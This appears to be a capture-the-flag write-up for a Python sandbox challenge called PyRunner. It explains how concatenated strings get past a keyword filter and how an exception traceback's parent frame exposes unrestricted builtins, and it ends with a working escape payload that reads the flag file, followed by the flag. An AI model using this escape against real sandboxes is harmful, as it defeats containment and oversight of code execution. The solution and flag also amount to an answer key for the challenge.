# PyRunner Challenge Solution

## Overview
PyRunner is a Python sandbox challenge that blocks many built-in functions, keywords (e.g., `import`, `__class__`, `__builtins__`), and attempts to restrict access to dangerous operations using string filtering and a restricted `globals()` environment.

## Initial Reconnaissance
The challenge provides a `/api/execute` endpoint that runs Python code.
1. **Allowed:** `print`, `int`, `list`, `dict`, `str`, `Exception`.
2. **Blocked via NameError:** `eval`, `exec`, `open`, `__import__`, `help`, `input`.
3. **Blocked via static analysis:** strings containing `__class__`, `__builtins__`, `import`, etc.
   > Even `x = '__class__'` is blocked if the literal string is present.

## Escape Strategy
The sandbox does not clear the `__traceback__` attribute of exceptions. We can use this to walk up the stack frame to find a `frame` object that belongs to the parent execution context (the server code running our sandbox). This parent frame contains the full, unrestricted `globals()` dictionary.

### Steps:
1. **Bypass Keyword Block:** Construct blocked strings (`__class__`, `__builtins__`, `import`) using concatenation: `'__buil' + 'tins__'`.
2. **Leak Stack Frame:**
   - Raise an Exception.
   - Catch it and access `e.__traceback__`.
   - Access `tb.tb_frame` to get the current frame.
   - Access `f.f_back` to get the caller's frame (the server's context).
3. **Access Real Builtins:**
   - Access `f_back.f_globals`.
   - Retrieve the `__builtins__` module/dict from the parent globals using the constructed key.
4. **Restore `open` / `import`:**
   - From the unrestricted builtins, retrieve `open` or `__import__`.
   - Use `os.listdir('.')` to find the flag file.
   - Use `open('flag...', 'r').read()` to get the flag.

## Final Payload
```python
try:
    raise Exception
except Exception as e:
    # 1. Walk up to parent frame
    frame = e.__traceback__.tb_frame.f_back
    
    # 2. Access parent globals
    g = frame.f_globals
    
    # 3. Access unrestricted builtins (constructing key to bypass filter)
    builtins_key = '__buil'+'tins__'
    builtins = g[builtins_key]
    
    # 4. Get 'open' function (constructing key if needed, though 'open' string itself wasn't blocked, the function was)
    # Note: 'open' string is safe, but calling open() directly was blocked.
    # In the parent builtins, 'open' is the real file opener.
    # We check if builtins is a dict or module
    try:
        opener = builtins['open']
    except:
        opener = builtins.__dict__['open']
    
    # 5. Read the flag
    # We found the filename via os.listdir('.') in a previous step
    flag_file = 'flag-16c4977d-be42-4bd6-a229-739e180dc37a.txt'
    print(opener(flag_file).read())
```

## Flag
`VSL{pyth0n_3xc3pt10n_tr4c3b4ck_fr4m3_l34k_s4ndb0x_3sc4p3_v14_tb_fr4m3_f_b4ck_4cc3ss_p4r3nt_fr4m3_th3n_f_gl0b4ls_g3t_r34l_bu1lt1ns_m0dul3_n0t_r3str1ct3d_d1ct_us3_chr_t0_byp4ss_k3yw0rd_f1lt3r_1mp0rt_0s_p0p3n_rc3}`
